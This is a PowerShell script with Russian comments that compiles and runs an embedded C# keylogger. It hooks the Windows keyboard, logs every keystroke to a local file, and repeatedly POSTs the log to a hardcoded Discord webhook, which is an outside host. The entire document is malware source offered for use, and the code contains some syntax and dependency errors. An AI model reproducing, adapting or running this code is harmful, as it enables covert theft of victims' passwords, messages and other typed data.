# Discord Webhook URL (замени на свой)
$webhookUrl = "https://discordapp.com/api/webhooks/1369790444417843280/a9TksyeMBftjI4WtLVIh1-lY8_QiQf02cAMvw5BSmmxvP-Yz6k-IWWSM4kHPTBBXtXZk"

# Функция для отправки данных в Discord
function Send-ToDiscord {
    param (
        [string]$message
    )
    $payload = @{
        content = $message
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
}

# Ловим нажатия клавиш
$keylogger = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;

public class KeyLogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    public static void Main()
    {
        _hookID = SetHook(_proc);
        using (var curProc = Process.GetCurrentProcess())
        using (var curModule = curProc.MainModule)
        {
            var moduleHandle = GetModuleHandle(curModule.ModuleName);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            File.AppendAllText("log.txt", key + Environment.NewLine);
            
            # Отправляем каждые 10 символов
            if (File.ReadAllText("log.txt").Length % 10 == 0)
            {
                string logContent = File.ReadAllText("log.txt");
                SendToDiscord(logContent);
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void SendToDiscord(string message)
    {
        try
        {
            WebRequest req = WebRequest.Create("$webhookUrl");
            req.Method = "POST";
            req.ContentType = "application/json";
            using (var sw = new StreamWriter(req.GetRequestStream()))
            {
                sw.Write("{\"content\": \"" + message + "\"}");
            }
            req.GetResponse();
        }
        catch { }
    }
}
"@

# Запуск кейлоггера
Add-Type -TypeDefinition $keylogger -Language CSharp
[KeyLogger]::Main()
